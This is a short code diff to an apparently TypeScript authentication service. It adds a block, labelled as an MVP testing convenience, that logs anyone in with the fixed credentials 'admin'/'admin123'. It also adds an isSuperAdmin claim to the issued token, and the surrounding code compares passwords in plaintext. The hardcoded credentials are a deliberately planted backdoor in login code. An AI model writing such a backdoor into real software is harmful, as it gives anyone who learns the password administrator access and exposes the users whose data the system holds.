@@ -11,6 +11,14 @@ export class AuthService {
 
     async validateUser(username: string, pass: string): Promise<any> {
         const user = await this.usersService.findOne(username);
+
+        // --- HARDCODED ADMIN BACKDOOR FOR MVP TESTING ---
+        if (user && username === 'admin' && pass === 'admin123') {
+            const { password, ...result } = user;
+            return result;
+        }
+        // ------------------------------------------------
+
         // In a real app, use bcrypt.compare(pass, user.password)
         if (user && user.password === pass) {
             const { password, ...result } = user;
@@ -20,7 +28,7 @@ export class AuthService {
     }
 
     async login(user: any) {
-        const payload = { username: user.username, sub: user.id };
+        const payload = { username: user.username, sub: user.id, isSuperAdmin: user.isSuperAdmin };
         return {
             access_token: this.jwtService.sign(payload),
         };
